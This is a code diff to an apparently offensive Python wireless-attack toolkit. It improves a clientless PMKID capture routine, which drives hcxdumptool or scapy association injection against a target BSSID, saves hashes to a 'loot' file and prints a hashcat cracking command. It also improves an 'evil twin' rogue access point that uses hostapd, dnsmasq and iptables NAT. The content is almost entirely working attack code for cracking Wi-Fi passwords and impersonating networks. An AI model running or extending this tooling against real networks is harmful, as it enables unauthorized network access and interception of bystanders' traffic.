@@ -15,7 +15,7 @@
 #   hostapd + dnsmasq:  sudo apt install hostapd dnsmasq
 #   Python:             scapy (Dot11 layers)
 
-import os, sys, re, time, json, subprocess, threading, shutil, signal, logging, atexit
+import os, sys, re, time, json, csv, subprocess, threading, shutil, signal, logging, atexit
 from datetime import datetime
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -98,15 +98,30 @@ def _run(cmd, **kwargs):
 
 def _check_tools():
     """Check which wireless tools are available."""
+    extra_paths = ["/usr/bin", "/usr/local/bin", "/usr/sbin", "/usr/local/sbin",
+                   "/opt/hcxtools/bin", "/opt/hcxdumptool"]
+
+    def _find(name):
+        hit = shutil.which(name)
+        if hit:
+            return hit
+        for d in extra_paths:
+            p = os.path.join(d, name)
+            if os.path.isfile(p) and os.access(p, os.X_OK):
+                return p
+        return None
+
     tools = {
-        "airmon-ng":   shutil.which("airmon-ng"),
-        "airodump-ng": shutil.which("airodump-ng"),
-        "aireplay-ng": shutil.which("aireplay-ng"),
-        "aircrack-ng": shutil.which("aircrack-ng"),
-        "hostapd":     shutil.which("hostapd"),
-        "dnsmasq":     shutil.which("dnsmasq"),
-        "iw":          shutil.which("iw"),
-        "iwconfig":    shutil.which("iwconfig"),
+        "airmon-ng":      _find("airmon-ng"),
+        "airodump-ng":    _find("airodump-ng"),
+        "aireplay-ng":    _find("aireplay-ng"),
+        "aircrack-ng":    _find("aircrack-ng"),
+        "hostapd":        _find("hostapd"),
+        "dnsmasq":        _find("dnsmasq"),
+        "iw":             _find("iw"),
+        "iwconfig":       _find("iwconfig"),
+        "hcxdumptool":    _find("hcxdumptool"),
+        "hcxpcapngtool":  _find("hcxpcapngtool"),
     }
     return tools
 
@@ -972,13 +987,11 @@ class PMKIDAttack:
     """
     Clientless WPA2/WPA3 attack. Captures PMKID from the AP's first EAPOL
     frame during association — no client needs to be connected.
-    The PMKID is derived from: HMAC-SHA1(PMK, 'PMK Name' + AP_MAC + STA_MAC)
-    Can be cracked offline without a full handshake.
+    PMKID = HMAC-SHA1(PMK, 'PMK Name' + AP_MAC + STA_MAC)
 
-    Uses hcxdumptool if available, otherwise scapy association approach.
+    Primary method: hcxdumptool (most reliable, handles AP filtering).
+    Fallback: scapy association injection.
     """
-
-    PMKID_SIG = bytes.fromhex("4f9f2c0ebd4800000000000000000000")
 
     def __init__(self, mon_iface, bssid, channel=1):
         self.iface   = mon_iface
@@ -986,71 +999,157 @@ class PMKIDAttack:
         self.channel = channel
         self._pmkids = []
 
-    def _extract_pmkid(self, pkt):
-        """Extract PMKID from EAPOL frame if present."""
-        if not pkt.haslayer(EAPOL): return None
+    # ── hcxdumptool primary method ─────────────────────────────────────────
 
+    def _attack_hcxdumptool(self, timeout, tools):
+        pcapng      = "/tmp/ktox_pmkid.pcapng"
+        filter_file = "/tmp/ktox_pmkid_bssid.txt"
+        hash_file   = "/tmp/ktox_pmkid_hashes.txt"
+
+        # Write BSSID filter (one per line, with colons)
+        with open(filter_file, "w") as fh:
+            fh.write(self.bssid + "\n")
+
+        # Clean stale capture
+        for f in (pcapng, hash_file):
+            try: os.remove(f)
+            except FileNotFoundError: pass
+
+        info(f"Running hcxdumptool on {self.iface} (target {self.bssid})...")
+        info(f"Capturing for up to {timeout}s — Ctrl+C to abort early.")
+
+        hcx_bin = tools["hcxdumptool"]
+        cmd = [
+            hcx_bin, "-i", self.iface,
+            "--enable_status=1",
+            "-o", pcapng,
+            "--filtermode=2",
+            f"--filterlist_ap={filter_file}",
+        ]
+
+        proc = None
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+            )
+            deadline = time.time() + timeout
+            while time.time() < deadline:
+                if proc.poll() is not None:
+                    break
+                line = proc.stdout.readline()
+                if not line:
+                    time.sleep(0.1)
+                    continue
+                line = line.strip()
+                if "PMKID" in line.upper():
+                    ok(f"hcxdumptool: {line}")
+                elif line:
+                    console.print(f"  [{C_DIM}]{line}[/{C_DIM}]")
+        except KeyboardInterrupt:
+            pass
+        finally:
+            if proc and proc.poll() is None:
+                proc.terminate()
+                try: proc.wait(timeout=3)
+                except subprocess.TimeoutExpired: proc.kill()
+
+        if not os.path.exists(pcapng):
+            warn("hcxdumptool produced no capture file.")
+            return []
+
+        # Parse with hcxpcapngtool if available
+        if tools.get("hcxpcapngtool"):
+            r = _run([tools["hcxpcapngtool"], pcapng, "-o", hash_file])
+            if os.path.exists(hash_file):
+                with open(hash_file) as fh:
+                    lines = [l.strip() for l in fh if l.strip()]
+                if lines:
+                    return self._import_hashes(lines)
+            warn("hcxpcapngtool ran but produced no hashes.")
+        else:
+            info("hcxpcapngtool not found — raw pcapng saved.")
+            info(f"Install: sudo apt install hcxtools")
+            info(f"Parse:   hcxpcapngtool {pcapng} -o hashes.txt")
+            ok(f"Capture saved → {pcapng}")
+            _loot("PMKID_PCAPNG", {"file": pcapng, "bssid": self.bssid})
+
+        return self._pmkids
+
+    def _import_hashes(self, lines):
+        """Store hashes from hcxpcapngtool output and log to loot file."""
+        os.makedirs(loot_dir, exist_ok=True)
+        loot_path = os.path.join(loot_dir, "pmkid_hashes.txt")
+        with open(loot_path, "a") as fh:
+            for line in lines:
+                fh.write(line + "\n")
+                parts = line.split("*")
+                pmkid = parts[0] if parts else line
+                bssid = parts[1] if len(parts) > 1 else self.bssid
+                sta   = parts[2] if len(parts) > 2 else ""
+                console.print(
+                    f"\n  [{C_BLOOD}]⚡ PMKID CAPTURED[/{C_BLOOD}]\n"
+                    f"  [{C_STEEL}]BSSID:[/{C_STEEL}]  [{C_WHITE}]{bssid}[/{C_WHITE}]\n"
+                    f"  [{C_STEEL}]STA:  [/{C_STEEL}]  [{C_ASH}]{sta}[/{C_ASH}]\n"
+                    f"  [{C_STEEL}]HASH: [/{C_STEEL}]  [{C_EMBER}]{pmkid[:32]}…[/{C_EMBER}]"
+                )
+                self._pmkids.append({"bssid": bssid, "sta": sta, "pmkid": pmkid})
+                _loot("PMKID_CAPTURED", {"bssid": bssid, "sta": sta, "pmkid": pmkid})
+        ok(f"Hashes saved → {loot_path}")
+        info("Crack: hashcat -m 22000 " + loot_path + " wordlist.txt")
+        return self._pmkids
+
+    # ── scapy fallback ─────────────────────────────────────────────────────
+
+    def _extract_pmkid(self, pkt):
+        if not pkt.haslayer(EAPOL): return None
         try:
             raw = bytes(pkt[EAPOL])
-            # PMKID is 16 bytes, found after RSN IE in association response
-            # or in the EAPOL key frame after the key data
-            # Look for PMKID KDE: 00-0F-AC:04
             kde_marker = bytes.fromhex("000fac04")
             idx = raw.find(kde_marker)
-            if idx >= 0 and len(raw) > idx + 4 + 16:
-                pmkid = raw[idx+4:idx+20]
-                return pmkid.hex()
+            if idx >= 0 and len(raw) > idx + 20:
+                return raw[idx+4:idx+20].hex()
         except: pass
         return None
 
-    def _handle(self, pkt):
+    def _handle_scapy(self, pkt):
         if not pkt.haslayer(Dot11): return
-
         addrs = [
-            getattr(pkt[Dot11], "addr1", "") or "",
-            getattr(pkt[Dot11], "addr2", "") or "",
-            getattr(pkt[Dot11], "addr3", "") or "",
+            (getattr(pkt[Dot11], "addr1", "") or "").lower(),
+            (getattr(pkt[Dot11], "addr2", "") or "").lower(),
+            (getattr(pkt[Dot11], "addr3", "") or "").lower(),
         ]
-        if self.bssid not in [a.lower() for a in addrs]: return
-
+        if self.bssid not in addrs: return
         pmkid = self._extract_pmkid(pkt)
         if pmkid and pmkid not in [p["pmkid"] for p in self._pmkids]:
             sta_mac = pkt[Dot11].addr1 or ""
-            console.print(
-                f"\n  [{C_BLOOD}]⚡ PMKID CAPTURED[/{C_BLOOD}]\n"
-                f"  [{C_STEEL}]BSSID:[/{C_STEEL}]  [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
-                f"  [{C_STEEL}]STA:  [/{C_STEEL}]  [{C_ASH}]{sta_mac}[/{C_ASH}]\n"
-                f"  [{C_STEEL}]PMKID:[/{C_STEEL}]  [{C_EMBER}]{pmkid}[/{C_EMBER}]"
-            )
-            self._pmkids.append({
-                "bssid": self.bssid,
-                "sta":   sta_mac,
-                "pmkid": pmkid
-            })
-            # Save in hashcat format: pmkid*bssid*sta*ssid
+            self._pmkids.append({"bssid": self.bssid, "sta": sta_mac, "pmkid": pmkid})
             self._save_pmkid(pmkid, sta_mac)
             stop_flag.set()
 
     def _save_pmkid(self, pmkid, sta_mac):
-        """Save PMKID in hashcat 22000 format."""
         os.makedirs(loot_dir, exist_ok=True)
-        path = os.path.join(loot_dir, "pmkid_hashes.txt")
-        # Format: PMKID*BSSID_no_colon*STA_no_colon*SSID_hex
+        path      = os.path.join(loot_dir, "pmkid_hashes.txt")
         bssid_raw = self.bssid.replace(":", "")
         sta_raw   = sta_mac.replace(":", "") if sta_mac else "000000000000"
         line      = f"{pmkid}*{bssid_raw}*{sta_raw}*"
-        with open(path, "a") as f:
-            f.write(line + "\n")
+        with open(path, "a") as fh:
+            fh.write(line + "\n")
+        console.print(
+            f"\n  [{C_BLOOD}]⚡ PMKID CAPTURED (scapy)[/{C_BLOOD}]\n"
+            f"  [{C_STEEL}]BSSID:[/{C_STEEL}]  [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
+            f"  [{C_STEEL}]STA:  [/{C_STEEL}]  [{C_ASH}]{sta_mac}[/{C_ASH}]\n"
+            f"  [{C_STEEL}]PMKID:[/{C_STEEL}]  [{C_EMBER}]{pmkid}[/{C_EMBER}]"
+        )
         ok(f"PMKID saved → {path}")
-        info("Crack: hashcat -m 22000 ktox_loot/pmkid_hashes.txt wordlist.txt")
-        _loot("PMKID_CAPTURED", {
-            "bssid": self.bssid, "sta": sta_mac, "pmkid": pmkid
-        })
+        info("Crack: hashcat -m 22000 " + path + " wordlist.txt")
+        _loot("PMKID_CAPTURED", {"bssid": self.bssid, "sta": sta_mac, "pmkid": pmkid})
 
     def _send_association(self):
-        """Send association request to trigger EAPOL from AP."""
-        info("Sending association request to trigger EAPOL...")
-        # Craft a probe then associate to get the AP to send EAPOL msg 1
+        info("Sending association requests to trigger EAPOL from AP...")
         frame = (
             RadioTap() /
             Dot11(type=0, subtype=0,
@@ -1059,48 +1158,55 @@ class PMKIDAttack:
                   addr3=self.bssid) /
             Dot11Auth(algo=0, seqnum=1, status=0)
         )
-        sendp(frame, iface=self.iface, verbose=False, count=3)
+        for _ in range(5):
+            sendp(frame, iface=self.iface, verbose=False, count=1)
+            time.sleep(0.5)
 
-    def attack(self, timeout=30):
-        """Capture PMKID from AP."""
-        section("PMKID CLIENTLESS ATTACK")
-        console.print(Panel(
-            f"  {tag('Target:', C_BLOOD)}   [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
-            f"  {tag('Channel:', C_STEEL)}  [{C_ASH}]{self.channel}[/{C_ASH}]\n\n"
-            f"  [{C_ASH}]Sends association request to AP.\n"
-            f"  AP responds with EAPOL msg 1 containing PMKID.\n"
-            f"  No connected client required.[/{C_ASH}]",
-            border_style=C_RUST,
-            title=f"[bold {C_BLOOD}]◈ PMKID ATTACK[/bold {C_BLOOD}]",
-            padding=(1,2)
-        ))
-
-        _run(["iw", self.iface, "set", "channel", str(self.channel)])
+    def _attack_scapy(self, timeout):
+        warn("hcxdumptool not found — using scapy association fallback.")
+        info("For best results install: sudo apt install hcxdumptool hcxtools")
+        _run(["iw", "dev", self.iface, "set", "channel", str(self.channel)])
         stop_flag.clear()
-
-        # Send assoc request after short delay
         threading.Thread(target=self._send_association, daemon=True).start()
-
         info(f"Listening for PMKID for {timeout}s...")
         try:
             sniff(
                 iface=self.iface,
-                prn=self._handle,
+                prn=self._handle_scapy,
                 store=False,
                 timeout=timeout,
-                stop_filter=lambda _: stop_flag.is_set()
+                stop_filter=lambda _: stop_flag.is_set(),
             )
         except KeyboardInterrupt:
             stop_flag.set()
 
         if not self._pmkids:
-            warn("No PMKID captured. AP may not be vulnerable or "
-                 "hcxdumptool may be more effective.")
-            info("Install hcxdumptool: sudo apt install hcxdumptool")
-            info("Run: hcxdumptool -i " + self.iface +
-                 " --enable_status=1 -o pmkid.pcapng")
-
+            warn("No PMKID captured via scapy. AP may not support PMKID or "
+                 "the association frames were ignored.")
         return self._pmkids
+
+    # ── Public entry point ─────────────────────────────────────────────────
+
+    def attack(self, timeout=30):
+        section("PMKID CLIENTLESS ATTACK")
+        tools = _check_tools()
+
+        method = "hcxdumptool" if tools.get("hcxdumptool") else "scapy (fallback)"
+        console.print(Panel(
+            f"  {tag('Target BSSID:', C_BLOOD)}  [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
+            f"  {tag('Channel:',      C_STEEL)}  [{C_ASH}]{self.channel}[/{C_ASH}]\n"
+            f"  {tag('Method:',       C_STEEL)}  [{C_EMBER}]{method}[/{C_EMBER}]\n\n"
+            f"  [{C_ASH}]Captures PMKID without a connected client.\n"
+            f"  PMKID can be cracked offline with hashcat -m 22000.[/{C_ASH}]",
+            border_style=C_RUST,
+            title=f"[bold {C_BLOOD}]◈ PMKID ATTACK[/bold {C_BLOOD}]",
+            padding=(1, 2)
+        ))
+
+        if tools.get("hcxdumptool"):
+            return self._attack_hcxdumptool(timeout, tools)
+        else:
+            return self._attack_scapy(timeout)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -1146,6 +1252,7 @@ no-resolv
         self._hostapd_proc  = None
         self._dnsmasq_proc  = None
         self._conf_dir      = "/tmp/ktox_eviltwin"
+        self._nat_active    = False
 
     def _write_configs(self):
         os.makedirs(self._conf_dir, exist_ok=True)
@@ -1173,12 +1280,31 @@ no-resolv
 
         return hostapd_path, dnsmasq_path
 
+    def _kill_conflicting(self):
+        """Kill processes that block the interface from being used as AP."""
+        # Kill system dnsmasq to free the port
+        _run(["systemctl", "stop", "dnsmasq"])
+        _run(["killall", "-q", "dnsmasq"])
+        # Kill any existing hostapd
+        _run(["systemctl", "stop", "hostapd"])
+        _run(["killall", "-q", "hostapd"])
+        # Stop wpa_supplicant on this interface
+        _run(["killall", "-q", "wpa_supplicant"])
+        time.sleep(0.5)
+
     def _setup_interface(self):
-        """Set interface to AP-friendly state."""
+        """Set interface to managed/AP-ready state with a clean IP assignment."""
         _run(["ip", "link", "set", self.iface, "down"])
-        _run(["iw", self.iface, "set", "type", "__ap"])
+        # Reset to managed mode (handles monitor-mode adapters gracefully)
+        _run(["iw", "dev", self.iface, "set", "type", "managed"])
+        time.sleep(0.3)
+        # Flush any existing IP addresses on this interface
+        _run(["ip", "addr", "flush", "dev", self.iface])
         _run(["ip", "link", "set", self.iface, "up"])
-        _run(["ip", "addr", "add", f"{self.gateway}/24", "dev", self.iface])
+        time.sleep(0.3)
+        r = _run(["ip", "addr", "add", f"{self.gateway}/24", "dev", self.iface])
+        if r.returncode != 0:
+            warn(f"Could not assign {self.gateway}/24 to {self.iface}: {r.stderr.strip()}")
 
     def _setup_nat(self):
         """Enable NAT if internet passthrough configured."""
@@ -1188,6 +1314,7 @@ no-resolv
                "-o", self.internet_iface, "-j", "MASQUERADE"])
         _run(["iptables", "-A", "FORWARD",
                "-i", self.iface, "-j", "ACCEPT"])
+        self._nat_active = True
         ok(f"NAT: {self.iface} → {self.internet_iface}")
 
     def start(self):
@@ -1211,6 +1338,7 @@ no-resolv
             padding=(1,2)
         ))
 
+        self._kill_conflicting()
         hostapd_path, dnsmasq_path = self._write_configs()
         self._setup_interface()
         if self.internet_iface:
@@ -1221,9 +1349,15 @@ no-resolv
             self._dnsmasq_proc = subprocess.Popen(
                 ["dnsmasq", "--conf-file=" + dnsmasq_path,
                  "--no-daemon", "--log-facility=-"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
+                text=True
             )
-            ok("dnsmasq started (DHCP server)")
+            time.sleep(0.5)
+            if self._dnsmasq_proc.poll() is not None:
+                err_out = self._dnsmasq_proc.stderr.read().strip()
+                err(f"dnsmasq failed to start: {err_out}")
+            else:
+                ok("dnsmasq started (DHCP server)")
 
         # Start hostapd
         self._hostapd_proc = subprocess.Popen(
@@ -1231,6 +1365,12 @@ no-resolv
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True
         )
+        time.sleep(1)
+        if self._hostapd_proc.poll() is not None:
+            out = self._hostapd_proc.stdout.read().strip()
+            err(f"hostapd failed to start:\n  {out}")
+            self.stop()
+            return False
         ok(f"hostapd started — broadcasting '{self.ssid}'")
         info("Watching for client connections...")
         info("Ctrl+C to stop.\n")
@@ -1271,13 +1411,23 @@ no-resolv
         return True
 
     def stop(self):
-        """Shut down the AP cleanly."""
-        if self._hostapd_proc:
+        """Shut down the AP cleanly and remove iptables rules."""
+        if self._hostapd_proc and self._hostapd_proc.poll() is None:
             self._hostapd_proc.terminate()
-            self._hostapd_proc.wait()
-        if self._dnsmasq_proc:
+            try: self._hostapd_proc.wait(timeout=3)
+            except subprocess.TimeoutExpired: self._hostapd_proc.kill()
+        if self._dnsmasq_proc and self._dnsmasq_proc.poll() is None:
             self._dnsmasq_proc.terminate()
-            self._dnsmasq_proc.wait()
+            try: self._dnsmasq_proc.wait(timeout=3)
+            except subprocess.TimeoutExpired: self._dnsmasq_proc.kill()
+        # Remove iptables NAT rules if we added them
+        if self._nat_active and self.internet_iface:
+            _run(["iptables", "-t", "nat", "-D", "POSTROUTING",
+                  "-o", self.internet_iface, "-j", "MASQUERADE"])
+            _run(["iptables", "-D", "FORWARD", "-i", self.iface, "-j", "ACCEPT"])
+            self._nat_active = False
+        # Flush IP and restore interface state
+        _run(["ip", "addr", "flush", "dev", self.iface])
         ok("Evil twin AP stopped.")
         _loot("EVIL_TWIN_STOP", {"ssid": self.ssid})
 
